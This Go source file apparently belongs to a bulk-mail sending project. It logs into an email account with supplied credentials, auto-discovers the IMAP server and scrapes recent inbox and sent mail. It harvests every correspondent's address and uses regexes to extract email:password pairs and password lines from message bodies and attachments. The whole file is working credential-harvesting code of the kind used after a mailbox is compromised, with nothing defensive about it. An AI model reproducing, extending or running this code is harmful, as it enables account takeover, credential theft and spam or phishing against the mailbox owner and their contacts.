package imapextract

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"regexp"
	"strings"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/emersion/go-message/mail"
	"github.com/wiz/sendsmtp/internal/imapdiscover"
)

var (
	emailRe = regexp.MustCompile(`(?i)\b[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,}\b`)
	// email;password or email|password or email:password
	credRe     = regexp.MustCompile(`(?i)([a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,})\s*[;|:]\s*([^\s<>"']{4,80})`)
	passLineRe = regexp.MustCompile(`(?im)(?:password|senha|pass|pwd)\s*[:=]\s*([^\s<>"']{4,80})`)
)

// Credential is an email+password pair found in messages.
type Credential struct {
	Email    string `json:"email"`
	Password string `json:"password"`
	Source   string `json:"source"` // header|body
}

// Result of a mailbox scrape.
type Result struct {
	IMAPHost     string       `json:"imap_host"`
	IMAPPort     int          `json:"imap_port"`
	IMAPEnc      string       `json:"imap_encryption"`
	Messages     int          `json:"messages_scanned"`
	Contacts     []string     `json:"contacts"`
	Credentials  []Credential `json:"credentials"`
	ContactsFile string       `json:"contacts_file,omitempty"`
	CredsFile    string       `json:"creds_file,omitempty"`
}

type Options struct {
	MaxMessages  uint32
	OnProgress   func(msg string)
	ProbeTimeout time.Duration
	Mailboxes    []string // default INBOX, Sent*
}

// Extract discovers IMAP for the account and scrapes contacts + credential pairs from recent mail.
func Extract(ctx context.Context, domain, user, password, smtpHostHint string, opt Options) (Result, error) {
	if opt.MaxMessages == 0 {
		opt.MaxMessages = 150
	}
	if opt.ProbeTimeout <= 0 {
		opt.ProbeTimeout = 3 * time.Second
	}
	if len(opt.Mailboxes) == 0 {
		opt.Mailboxes = []string{"INBOX", "Sent", "Sent Items", "INBOX.Sent", "[Gmail]/Sent Mail"}
	}
	report := func(m string) {
		if opt.OnProgress != nil {
			opt.OnProgress(m)
		}
	}

	imapRes, err := imapdiscover.Discover(ctx, domain, user, password, imapdiscover.Options{
		HintHost:     smtpHostHint,
		ProbeTimeout: opt.ProbeTimeout,
		Workers:      3,
		OnProgress:   opt.OnProgress,
	})
	if err != nil {
		return Result{}, err
	}

	report(fmt.Sprintf("lendo mensagens em %s:%d…", imapRes.Host, imapRes.Port))
	c, err := dialIMAP(ctx, imapRes, opt.ProbeTimeout+2*time.Second)
	if err != nil {
		return Result{}, err
	}
	defer func() { _ = c.Logout() }()

	if err := c.Login(user, password); err != nil {
		return Result{}, fmt.Errorf("imap login: %w", err)
	}

	contacts := map[string]struct{}{}
	creds := map[string]Credential{} // key email|pass
	var scanned int

	mailboxes, _ := listMailboxNames(c)
	targets := pickMailboxes(opt.Mailboxes, mailboxes)

	for _, box := range targets {
		if ctx.Err() != nil {
			break
		}
		report(fmt.Sprintf("pasta %s…", box))
		mbox, err := c.Select(box, true)
		if err != nil || mbox.Messages == 0 {
			continue
		}
		n := opt.MaxMessages
		if mbox.Messages < n {
			n = mbox.Messages
		}
		from := mbox.Messages - n + 1
		seqset := new(imap.SeqSet)
		seqset.AddRange(from, mbox.Messages)

		section := &imap.BodySectionName{}
		items := []imap.FetchItem{imap.FetchEnvelope, section.FetchItem()}
		messages := make(chan *imap.Message, 16)
		done := make(chan error, 1)
		go func() {
			done <- c.Fetch(seqset, items, messages)
		}()

		for msg := range messages {
			scanned++
			if msg.Envelope != nil {
				addAddrs(contacts, msg.Envelope.From)
				addAddrs(contacts, msg.Envelope.To)
				addAddrs(contacts, msg.Envelope.Cc)
				addAddrs(contacts, msg.Envelope.ReplyTo)
				addAddrs(contacts, msg.Envelope.Sender)
			}
			r := msg.GetBody(section)
			if r == nil {
				continue
			}
			text := readMailText(r)
			for _, e := range emailRe.FindAllString(text, -1) {
				e = strings.ToLower(strings.TrimSpace(e))
				if looksLikeEmail(e) {
					contacts[e] = struct{}{}
				}
			}
			for _, m := range credRe.FindAllStringSubmatch(text, -1) {
				if len(m) < 3 {
					continue
				}
				em := strings.ToLower(strings.TrimSpace(m[1]))
				pw := strings.TrimSpace(m[2])
				if !looksLikeEmail(em) || !looksLikePassword(pw) {
					continue
				}
				key := em + "|" + pw
				creds[key] = Credential{Email: em, Password: pw, Source: "body"}
				contacts[em] = struct{}{}
			}
			// password: xxx lines — pair with nearest email in same chunk
			if passM := passLineRe.FindStringSubmatch(text); len(passM) > 1 {
				pw := strings.TrimSpace(passM[1])
				if looksLikePassword(pw) {
					emails := emailRe.FindAllString(text, 3)
					for _, em := range emails {
						em = strings.ToLower(em)
						if looksLikeEmail(em) {
							key := em + "|" + pw
							if _, ok := creds[key]; !ok {
								creds[key] = Credential{Email: em, Password: pw, Source: "body"}
							}
						}
					}
				}
			}
			if scanned%25 == 0 {
				report(fmt.Sprintf("%s: %d msgs, %d contatos, %d senhas…", box, scanned, len(contacts), len(creds)))
			}
		}
		if err := <-done; err != nil {
			report(fmt.Sprintf("fetch %s: %v", box, err))
		}
	}

	out := Result{
		IMAPHost: imapRes.Host,
		IMAPPort: imapRes.Port,
		IMAPEnc:  imapRes.Encryption,
		Messages: scanned,
	}
	for e := range contacts {
		// skip the mailbox owner
		if e == strings.ToLower(user) {
			continue
		}
		out.Contacts = append(out.Contacts, e)
	}
	for _, c := range creds {
		out.Credentials = append(out.Credentials, c)
	}
	return out, nil
}

func dialIMAP(ctx context.Context, r imapdiscover.Result, timeout time.Duration) (*client.Client, error) {
	addr := fmt.Sprintf("%s:%d", r.Host, r.Port)
	dialer := &net.Dialer{Timeout: timeout}
	type res struct {
		c   *client.Client
		err error
	}
	ch := make(chan res, 1)
	go func() {
		var (
			c   *client.Client
			err error
		)
		if strings.EqualFold(r.Encryption, "ssl") || r.Port == 993 {
			c, err = client.DialWithDialerTLS(dialer, addr, &tls.Config{ServerName: r.Host, MinVersion: tls.VersionTLS12})
		} else {
			c, err = client.DialWithDialer(dialer, addr)
			if err == nil {
				err = c.StartTLS(&tls.Config{ServerName: r.Host, MinVersion: tls.VersionTLS12})
			}
		}
		ch <- res{c, err}
	}()
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case r := <-ch:
		return r.c, r.err
	}
}

func listMailboxNames(c *client.Client) ([]string, error) {
	ch := make(chan *imap.MailboxInfo, 16)
	done := make(chan error, 1)
	go func() { done <- c.List("", "*", ch) }()
	var names []string
	for m := range ch {
		if m != nil {
			names = append(names, m.Name)
		}
	}
	return names, <-done
}

func pickMailboxes(wanted, available []string) []string {
	if len(available) == 0 {
		return []string{"INBOX"}
	}
	availLower := map[string]string{}
	for _, a := range available {
		availLower[strings.ToLower(a)] = a
	}
	var out []string
	seen := map[string]struct{}{}
	for _, w := range wanted {
		if real, ok := availLower[strings.ToLower(w)]; ok {
			if _, s := seen[real]; !s {
				out = append(out, real)
				seen[real] = struct{}{}
			}
		}
	}
	if _, ok := seen["INBOX"]; !ok {
		if real, ok := availLower["inbox"]; ok {
			out = append([]string{real}, out...)
		} else {
			out = append([]string{"INBOX"}, out...)
		}
	}
	return out
}

func addAddrs(dst map[string]struct{}, addrs []*imap.Address) {
	for _, a := range addrs {
		if a == nil {
			continue
		}
		e := strings.ToLower(strings.TrimSpace(a.Address()))
		if looksLikeEmail(e) {
			dst[e] = struct{}{}
		}
	}
}

func readMailText(r io.Reader) string {
	mr, err := mail.CreateReader(r)
	if err != nil {
		b, _ := io.ReadAll(io.LimitReader(r, 256<<10))
		return string(b)
	}
	var b strings.Builder
	for {
		p, err := mr.NextPart()
		if err != nil {
			break
		}
		switch p.Header.(type) {
		case *mail.InlineHeader, *mail.AttachmentHeader:
			chunk, _ := io.ReadAll(io.LimitReader(p.Body, 128<<10))
			b.Write(chunk)
			b.WriteByte('\n')
		}
	}
	return b.String()
}

func looksLikeEmail(e string) bool {
	if len(e) < 6 || len(e) > 254 || !strings.Contains(e, "@") {
		return false
	}
	if strings.Contains(e, "example.com") || strings.HasSuffix(e, ".png") || strings.HasSuffix(e, ".jpg") {
		return false
	}
	return emailRe.MatchString(e)
}

func looksLikePassword(pw string) bool {
	if len(pw) < 4 || len(pw) > 80 {
		return false
	}
	lower := strings.ToLower(pw)
	switch lower {
	case "null", "none", "password", "senha", "true", "false", "http", "https":
		return false
	}
	if strings.HasPrefix(lower, "http") {
		return false
	}
	return true
}
